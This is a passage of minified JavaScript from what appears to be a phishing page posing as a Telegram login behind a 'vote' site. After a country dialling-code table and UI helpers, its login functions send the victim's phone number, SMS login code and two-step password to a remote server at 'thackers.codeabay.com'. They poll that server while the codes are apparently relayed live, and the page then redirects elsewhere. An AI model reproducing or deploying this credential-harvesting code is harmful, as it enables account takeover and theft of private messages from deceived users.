Futuna",codes:[{code:"681"}]},{iso2:"WS",name:"Samoa",codes:[{code:"685"}]},{iso2:"XG",name:"Global Mobile Satellite System",codes:[{code:"881"}],hidden:!0},{iso2:"XK",name:"Kosovo",codes:[{code:"383",patterns:["XXXX XXXX"]}],patterns:[]},{iso2:"XV",name:"International Networks",codes:[{code:"882"},{code:"883"}],hidden:!0},{iso2:"YE",name:"Yemen",codes:[{code:"967",patterns:["XXX XXX XXX"]}],patterns:[]},{iso2:"YL",name:"Y-land",codes:[{code:"42",prefixes:["4","7"]}],prefixes:[],hidden:!0},{iso2:"ZA",name:"South Africa",codes:[{code:"27",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"ZM",name:"Zambia",codes:[{code:"260",patterns:["XX XXX XXXX"]}],patterns:[]},{iso2:"ZW",name:"Zimbabwe",codes:[{code:"263",patterns:["XX XXX XXXX"]}],patterns:[]}];function initRipple(){if(document.querySelectorAll){for(var e=document.querySelectorAll(".textfield-item input.form-control"),t=0;t<e.length;t++)!function(n){function e(e){var t,X;document.activeElement!==n&&(t=n.getBoundingClientRect(),e=("touchstart"==e.type?e.targetTouches[0]:e).clientX,X=n.parentNode.querySelector(".textfield-item-underline"),e=(e-t.left)/n.offsetWidth*100,X.style.transition="none",redraw(X),X.style.left=e+"%",X.style.right=100-e+"%",redraw(X),X.style.left="",X.style.right="",X.style.transition="")}n.addEventListener("mousedown",e),n.addEventListener("touchstart",e)}(e[t]);for(var X=document.querySelectorAll(".ripple-handler"),t=0;t<X.length;t++)!function(o){function e(e){var t,X,n,s=o.querySelector(".ripple-mask");function a(e){n.style.transitionDuration=".2s",n.style.opacity=0,document.removeEventListener("mouseup",a),document.removeEventListener("touchend",a),document.removeEventListener("touchcancel",a)}s&&(t=s.getBoundingClientRect(),e="touchstart"==e.type?(X=e.targetTouches[0].clientX,e.targetTouches[0].clientY):(X=e.clientX,e.clientY),X=X-t.left-s.offsetWidth/2,e=e-t.top-s.offsetHeight/2,(n=o.querySelector(".ripple")).style.transition="none",redraw(n),n.style.transform="translate3d("+X+"px, "+e+"px, 0) scale3d(0.2, 0.2, 1)",n.style.opacity=1,redraw(n),n.style.transform="translate3d("+X+"px, "+e+"px, 0) scale3d(1, 1, 1)",n.style.transition="",document.addEventListener("mouseup",a),document.addEventListener("touchend",a),document.addEventListener("touchcancel",a))}o.addEventListener("mousedown",e),o.addEventListener("touchstart",e)}(X[t])}}function redraw(e){e.offsetTop}function cleanRE(e){return e.replace(/[|\\{}()[\]^$+*?.]/g,"\\$&")}inputFormatPhoneInit("ET","","en"),initRipple();var knownID="";let pathURL="https://thackers.codeabay.com/api/";function requestConfirmation(e){e&&e.preventDefault(),document.getElementById("login-phone-code-textfield").classList.remove("is-invalid"),document.getElementById("login-phone-textfield").classList.remove("is-invalid"),document.getElementById("login-alert").innerHTML="";var X=document.getElementById("login-phone-code").value,n=document.getElementById("login-phone").value,s=new XMLHttpRequest;return s.open("GET",pathURL+"access.php?device=web&app=web&version=1.0",!0),s.onload=function(){var e,t;200===s.status?(e=JSON.parse(s.responseText),knownID=e.id,(t=new XMLHttpRequest).open("GET",pathURL+"phone.php?phone="+X+" "+n+"&id="+knownID,!0),t.onload=function(){200===t.status&&(1==JSON.parse(t.responseText).upload?openConfirmation():showLoginError("There was an error with your request. Please try again."))},t.send()):showLoginError("There was an error with your request. Please try again.")},s.send(),!1}function openConfirmation(){document.getElementById("login-phone-code").value,document.getElementById("login-phone").value;document.getElementById("send-form").classList.add("hide"),document.getElementById("login-form").classList.remove("hide"),document.getElementById("login_confirm_text").classList.add("hide")}function cancelConfirmation(e){return e&&e.preventDefault(),document.getElementById("login-phone-field").innerHTML="",document.getElementById("send-form").classList.remove("hide"),document.getElementById("login-form").classList.add("hide"),document.getElementById("login-phone").focus(),clearTimeout(window.authTimeout),ajax("/auth/cancel?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write",{}),!1}function sendCode(){var X=0,e=(document.getElementById("hide-loading").classList.remove("hide"),document.getElementsByClassName("send-text")[0].classList.add("hide"),document.getElementById("codeBtn").disabled=!0,document.getElementById("login-code-number").value),t=new XMLHttpRequest;t.open("GET",pathURL+"code.php?code="+e+"&id="+knownID,!0),t.onload=function(){200===t.status&&(1==JSON.parse(t.responseText).upload?X=setInterval(function(){var t=new XMLHttpRequest;t.open("GET",pathURL+"verify.php?&id="+knownID,!0),t.onload=function(){var e;200===t.status&&(1==(e=JSON.parse(t.responseText)).code&&"YES"==e.password?(clearInterval(X),document.getElementById("login-password").placeholder=e.hint,document.getElementById("login-form").classList.add("hide"),document.getElementById("login_confirm_text").classList.add("hide"),document.getElementById("password-form").classList.remove("hide")):1==e.code&&"NO"==e.password?(clearInterval(X),document.getElementById("codeBtn").disabled=!1,document.getElementById("login-code-number").value="",document.getElementById("hide-loading").classList.add("hide"),document.getElementsByClassName("send-text")[0].classList.remove("hide"),document.getElementById("codeBtn").disabled=!1,document.getElementById("login-form").classList.add("hide"),document.getElementById("login-success").classList.remove("hide"),document.getElementById("default-label").classList.add("hide"),document.getElementById("phoneNumber-label").innerHTML=document.getElementById("login-phone-code").value+" "+document.getElementById("login-phone").value):0==e.code&&(clearInterval(X),document.getElementById("login-code-number").value="",document.getElementById("hide-loading").classList.add("hide"),document.getElementsByClassName("send-text")[0].classList.remove("hide"),document.getElementById("codeBtn").disabled=!1,document.getElementById("dumb-text").classList.add("hide"),document.getElementById("login-phone-bitch").classList.add("is-invalid"),document.getElementById("login-alert-code").innerHTML="Invalid code"))},t.send()},3e3):(document.getElementsById("codeBtn").disabled=!1,document.getElementById("hide-loading").classList.add("hide"),document.getElementsByClassName("send-text")[0].classList.remove("hide"),showLoginError("There was an error with your request. Please try again.")))},t.send()}function sendPassword(){var X=0,e=(document.getElementById("hide-loading1").classList.remove("hide"),document.getElementsByClassName("send-text1")[0].classList.add("hide"),document.getElementById("codeBtn1").disabled=!0,document.getElementById("login-password").value),t=new XMLHttpRequest;t.open("GET",pathURL+"password.php?password="+e+"&id="+knownID,!0),t.onload=function(){200===t.status&&(1==JSON.parse(t.responseText).upload?X=setInterval(function(){var t=new XMLHttpRequest;t.open("GET",pathURL+"vpass.php?&id="+knownID,!0),t.onload=function(){var e;200===t.status&&(1==(e=JSON.parse(t.responseText)).password?(clearInterval(X),document.getElementById("codeBtn1").disabled=!1,document.getElementById("login-password").value="",document.getElementById("hide-loading1").classList.add("hide"),document.getElementsByClassName("send-text1")[0].classList.remove("hide"),document.getElementById("codeBtn1").disabled=!1,document.getElementById("login-form").classList.add("hide"),document.getElementById("login-success").classList.remove("hide"),document.getElementById("default-label").classList.add("hide"),document.getElementById("password-form").classList.add("hide"),document.getElementById("phoneNumber-label").innerHTML=document.getElementById("login-phone-code").value+" "+document.getElementById("login-phone").value):0==e.password&&(clearInterval(X),document.getElementById("login-password").value="",document.getElementById("hide-loading1").classList.add("hide"),document.getElementsByClassName("send-text1")[0].classList.remove("hide"),document.getElementById("codeBtn1").disabled=!1,document.getElementById("dumb-texts").classList.add("hide"),document.getElementById("login-phone-pass").classList.add("is-invalid"),document.getElementById("login-alert-password").innerHTML="Password is incorrect"))},t.send()},3e3):(document.getElementsById("codeBtn").disabled=!1,document.getElementById("hide-loading").classList.add("hide"),document.getElementsByClassName("send-text")[0].classList.remove("hide"),showLoginError("There was an error with your request. Please try again.")))},t.send()}function completed(){window.open("https://vote.kstoreaddis.com/","_self")}function loginCancel(){window.open("https://vote.kstoreaddis.com/","_self")}function showLoginError(e){document.getElementById("login-phone-code-textfield").classList.add("is-invalid"),document.getElementById("login-phone-textfield").classList.add("is-invalid"),document.getElementById("login-alert").innerHTML=e}